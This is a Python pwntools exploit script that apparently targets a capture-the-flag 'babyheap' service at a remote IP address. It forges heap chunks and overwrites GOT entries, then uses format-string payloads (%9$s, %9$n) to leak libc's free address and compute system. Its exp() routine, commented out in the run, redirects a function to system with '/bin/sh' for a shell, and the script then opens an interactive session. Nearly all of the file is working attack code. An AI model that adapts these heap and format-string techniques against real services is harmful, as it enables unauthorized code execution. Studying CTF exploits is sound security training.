#! /usr/bin/python
from time import *
from pwn import *
class mypwn(object):

    def __init__(self):
        self.io=remote("202.120.7.104",10013)
        #self.io=process("./babyheap")
        self.elf=ELF("./babyheap")
        self.libc=ELF("./libc")

    def debug(self):
        sc='x /20gx *0x6020b0\nb printf\n'
        pwnlib.gdb.attach(self.io,sc)

    def new(self,size,content,name):
        self.io.recvuntil(":")
        self.io.sendline("1")
        self.io.recvuntil(":")
        self.io.sendline(str(size))
        self.io.recvuntil(":")
        self.io.send(content)
        self.io.recvuntil(":")
        self.io.send(name)

    def delete(self):
        self.io.recvuntil(":")
        self.io.sendline("2")

    def edit(self,content):
        self.io.recvuntil(":")
        self.io.sendline("3")
        self.io.recvuntil(":")
        self.io.send(content)

    def stdin_buf(self,data):
        self.io.recvuntil(":")
        self.io.sendline("4")
        self.io.recvuntil("n)")
        time.sleep(0.2)
        self.io.send(data)

    def leak(self):
        addr_got_free=0x602018
        self.io.recvuntil(":")
        self.io.send("%9$s    "+p64(addr_got_free))
        addr_free=self.io.recvuntil("    ")[:-4]
        addr=0
        rate=1
        for t in addr_free:
            addr+=ord(t)*rate
            rate*=256
        self.addr_free=addr
        print "addr_free   :"+hex(self.addr_free)
        

        self.addr_system=self.addr_free-self.libc.symbols['free']+self.libc.symbols['system']

    def exp(self):
        addr_flag_edit=0x6020a4
        self.io.recvuntil(":")
        self.io.send("%9$n    "+p64(addr_flag_edit))
        self.io.recvuntil(":")
        self.io.send("aaa")
        payload=self.rewrite_got+p64(self.addr_system)
        self.io.send(payload)
        self.io.recvuntil(":")
        self.io.recvuntil(":")
        self.io.send("/bin/sh")
    def run(self):
        addr_got_exit=0x602020
        addr_plt_alarm=0x400790
        addr_plt_read=0x4007a0
        addr_plt_puts=0x400760
        addr_plt_printf=0x400780
        addr_plt_malloc=0x4007d0
        chunk_1  = 'nn'
        chunk_1 += '\x00'*(0x1000-0x18-len(chunk_1))
        chunk_1 += p64(0x51)
        self.stdin_buf(chunk_1)
        chunk_3  = p64(0)
        chunk_3 += p64(0x21)
        self.new(0x80, chunk_3, 'A'*8)
        self.delete()
    
        self.rewrite_got  = p64(addr_plt_alarm)      # _exit
        self.rewrite_got += p64(addr_plt_read)       # __read_chk
        self.rewrite_got += p64(addr_plt_puts+6)     # puts
        self.rewrite_got += p64(0xdeadbeef)
        self.rewrite_got += p64(addr_plt_printf+6)   # printf
        self.rewrite_got += p64(addr_plt_alarm+6)    # alarm
        self.rewrite_got += p64(addr_plt_read+6)     # read
        self.rewrite_got += p64(0xdeadbeef)
        self.rewrite_got += p64(0xdeadbeef)
        self.rewrite_got += p64(0xdeadbeef)
        self.rewrite_got += p64(0xdeadbeef)
        payload = self.rewrite_got+p64(addr_plt_printf)     # atoi
        chunk_2  = '\x00'*0x20
        chunk_2 += p64(len(payload))        # size
        chunk_2 += p64(0)                       # name (over written)
        chunk_2 += p64(addr_got_exit)           # &content

        self.new(0x40,chunk_2,'name')
        self.edit(payload)   
        
        self.leak()
        #self.exp()
        #self.debug()
        self.io.interactive()
        return


p=mypwn()
p.run()